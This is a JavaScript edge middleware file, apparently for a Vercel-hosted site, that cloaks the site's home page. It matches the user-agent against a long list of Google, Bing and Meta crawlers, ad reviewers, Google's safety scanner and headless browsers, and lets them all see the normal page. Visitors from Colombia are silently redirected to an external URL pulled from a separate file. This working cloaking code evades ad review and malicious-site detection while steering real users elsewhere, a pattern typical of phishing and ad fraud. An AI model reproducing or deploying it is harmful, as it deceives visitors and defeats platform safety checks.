export const config = {
  matcher: ["/", "/index.html"]
};

const BOT_REVISION_RE = /googlebot-image|googlebot-video|googlebot-news|googlebot|storebot-google|google-inspectiontool|googleother-image|googleother-video|googleother|google-cloudvertexbot|google-extended|google-cws|google-gemininotebook|google-notebooklm|google-agent|googlemessages|google-pinpoint|googleproducer|google-read-aloud|google-site-verification|google-speakr|googleweblight|google favicon|feedfetcher-google|apis-google|adsbot-google-mobile-apps|adsbot-google-mobile|adsbot-google|mediapartners-google|google-safety|google-amphtml|google-pagerenderer|google-adwords|google-ads|googleassociation|google-structured-data|chrome-lighthouse|pagespeed|adidxbot|bingbot|bingpreview|microsoftpreview|msnbot-media|msnbot|skypeuripreview|linkedinbot|bingads|microsoft-advertising|facebookexternalhit|facebookexternalua|facebookcatalog|facebookplatform|facebookscraper|facebookbot|facebot|meta-externalads|meta-externalagent|meta-externalfetcher|meta-webindexer|headlesschrome|phantomjs|puppeteer|playwright/i;

function esBot(ua) {
  ua = String(ua || "");
  if (!ua) return false;
  if (BOT_REVISION_RE.test(ua)) return true;
  if (/google\.com\/(bot|adsbot|mobile\/adsbot|feedfetcher)\.html/i.test(ua)) return true;
  if (/developers\.google\.com\/crawling/i.test(ua)) return true;
  if (/bing\.com\/bingbot\.htm/i.test(ua)) return true;
  if (/aka\.ms\/microsoftpreview/i.test(ua)) return true;
  if (/facebook\.com\/externalhit/i.test(ua)) return true;
  if (/developers\.facebook\.com\/docs\/sharing\/webmasters\/web-crawlers/i.test(ua)) return true;
  return false;
}

export default async function middleware(request) {
  if (esBot(request.headers.get("user-agent"))) return;

  const country = String(request.headers.get("x-vercel-ip-country") || "").toUpperCase();
  if (country !== "CO") return;

  try {
    const js = await fetch(new URL("/ENLACES-IP.js", request.url), { cache: "no-store" }).then(function (r) {
      return r.text();
    });
    const match = js.match(/colombia\s*:\s*["']([^"']+)["']/);
    if (!match) return;
    const dest = match[1];
    const destUrl = new URL(dest, request.url);
    if (destUrl.origin === new URL(request.url).origin) return;
    return Response.redirect(dest, 302);
  } catch (e) {
    return;
  }
}
